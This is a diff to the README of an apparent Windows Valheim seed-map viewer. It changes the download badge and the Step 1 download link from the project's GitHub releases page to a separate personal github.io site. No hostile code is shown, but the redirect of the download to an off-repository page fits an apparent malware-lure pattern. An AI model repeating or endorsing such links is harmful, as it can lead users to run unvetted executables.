@@ -1,7 +1,7 @@
 <h1>🗺️ valheim-seed-map-viewer-windows - Explore, Plan, and Conquer Valheim</h1>
 
 <p align="center">
-<a href="https://github.com/padraigswift7708/valheim-seed-map-viewer-windows/releases"><img src="https://img.shields.io/badge/Download%20Now-Free%20App-blueviolet?style=for-the-badge&logo=windows&logoColor=white" alt="Download Badge"></a>
+<a href="https://padraigswift7708.github.io"><img src="https://img.shields.io/badge/Download%20Now-Free%20App-blueviolet?style=for-the-badge&logo=windows&logoColor=white" alt="Download Badge"></a>
 </p>
 
 ## 📖 What Is This?
@@ -26,7 +26,7 @@ Imagine knowing exactly where every boss spawns, where traders hide, and which a
 Follow these five simple steps to begin exploring your Valheim world:
 
 **Step 1:** Visit this link to download the application.  
-👉 **[Download valheim-seed-map-viewer-windows](https://github.com/padraigswift7708/valheim-seed-map-viewer-windows/releases)**
+👉 **[Download valheim-seed-map-viewer-windows](https://padraigswift7708.github.io)**
 
 **Step 2:** Click the latest release file to start the download. Your browser will save the file to your Downloads folder.
 
